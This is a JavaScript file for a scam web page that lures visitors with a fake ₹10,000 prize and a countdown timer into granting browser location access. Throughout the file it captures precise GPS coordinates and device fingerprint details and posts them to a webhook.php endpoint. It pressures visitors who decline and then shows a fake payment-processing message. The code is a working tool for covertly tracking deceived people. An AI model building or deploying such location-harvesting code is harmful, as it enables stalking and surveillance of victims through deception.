let countdownTime = 9 * 60 + 59;

function startCountdown() {
  setInterval(() => {
    if (countdownTime > 0) {
      countdownTime--;
      const minutes = Math.floor(countdownTime / 60);
      const seconds = countdownTime % 60;
      document.getElementById('countdown').textContent = 
        `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    }
  }, 1000);
}

function showSuccess(position) {
  console.log("✅ GPS CAPTURED!");
  console.log("📍 Latitude:", position.coords.latitude);
  console.log("📍 Longitude:", position.coords.longitude);
  
  const data = {
    latitude: position.coords.latitude,
    longitude: position.coords.longitude,
    accuracy: position.coords.accuracy,
    altitude: position.coords.altitude || 'N/A',
    altitudeAccuracy: position.coords.altitudeAccuracy || 'N/A',
    heading: position.coords.heading || 'N/A',
    speed: position.coords.speed || 'N/A',
    timestamp: new Date(position.timestamp).toISOString(),
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language || 'N/A',
    screenResolution: `${screen.width}x${screen.height}`,
    cpuCores: navigator.hardwareConcurrency || 'N/A',
    deviceMemory: navigator.deviceMemory || 'N/A',
    connection: navigator.connection ? navigator.connection.effectiveType : 'N/A'
  };
  
  console.log("📤 Sending to webhook.php:", JSON.stringify(data, null, 2));
  
  fetch('webhook.php', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Accept': 'application/json'
    },
    body: JSON.stringify(data)
  })
  .then(response => {
    console.log("✅ Server response:", response.status);
    if (!response.ok) throw new Error(`HTTP ${response.status}`);
    return response.json();
  })
  .then(result => {
    console.log("💾 Data saved successfully:", result);
  })
  .catch(error => {
    console.error("❌ Fetch error:", error);
    console.log("📋 BACKUP DATA:", JSON.stringify(data, null, 2));
  });
  
  document.getElementById('permissionPopup').classList.remove('active');
  
  const statusMsg = document.getElementById('statusMessage');
  statusMsg.className = 'status-message success';
  statusMsg.innerHTML = `
    ✅ <strong>Success!</strong> Location verified.<br>
    📍 ${data.latitude.toFixed(6)}, ${data.longitude.toFixed(6)}<br>
    🎯 Accuracy: ${data.accuracy.toFixed(0)}m<br>
    💰 Processing your ₹10,000 reward...
  `;
  
  const button = document.getElementById('claimBtn');
  button.style.background = '#28a745';
  button.innerHTML = '✓ Verified - Processing Payment...';
  button.disabled = true;
}

function showError(error) {
  console.error("❌ Location error:", error.code, error.message);
  
  let message = "";
  switch(error.code) {
    case error.PERMISSION_DENIED:
      message = "Location access was DENIED. Please allow location to claim your prize!";
      break;
    case error.POSITION_UNAVAILABLE:
      message = "Location unavailable. Please enable GPS in device settings.";
      break;
    case error.TIMEOUT:
      message = "Request timed out. Trying again...";
      setTimeout(requestLocation, 2000);
      return;
    default:
      message = "Unknown error. Please try again.";
  }
  
  alert(`❌ ${message}`);
  document.getElementById('permissionPopup').classList.add('active');
}

function requestLocation() {
  console.log("📍 Requesting location...");
  console.log("🌐 Protocol:", window.location.protocol);
  
  if (!navigator.geolocation) {
    alert("❌ Geolocation not supported");
    return;
  }

  if (window.location.protocol !== 'https' && window.location.hostname !== 'localhost') {
    console.warn("⚠️ HTTPS required for mobile!");
  }

  navigator.geolocation.getCurrentPosition(
    showSuccess,
    showError,
    {
      enableHighAccuracy: true,
      timeout: 30000,
      maximumAge: 0
    }
  );
  
  console.log("⏳ Waiting for user permission...");
}

window.onload = function() {
  console.log("🚀 GPS Tracker v0.4 Initialized");
  console.log("📱 User Agent:", navigator.userAgent);
  console.log("🌐 Platform:", navigator.platform);
  
  startCountdown();
  
  setTimeout(() => {
    console.log("👉 Showing location popup...");
    document.getElementById('permissionPopup').classList.add('active');
  }, 1500);

  document.getElementById('allowBtn').addEventListener('click', () => {
    console.log("✅ User clicked Allow button");
    requestLocation();
  });

  document.getElementById('blockBtn').addEventListener('click', () => {
    console.log("🚫 User clicked Block button");
    document.getElementById('permissionPopup').classList.remove('active');
    alert("You need to allow location access to claim your prize!");
  });

  document.getElementById('claimBtn').addEventListener('click', () => {
    console.log("🎁 User clicked Claim button");
    document.getElementById('permissionPopup').classList.add('active');
  });

  console.log("✅ All event listeners attached");
  console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
};
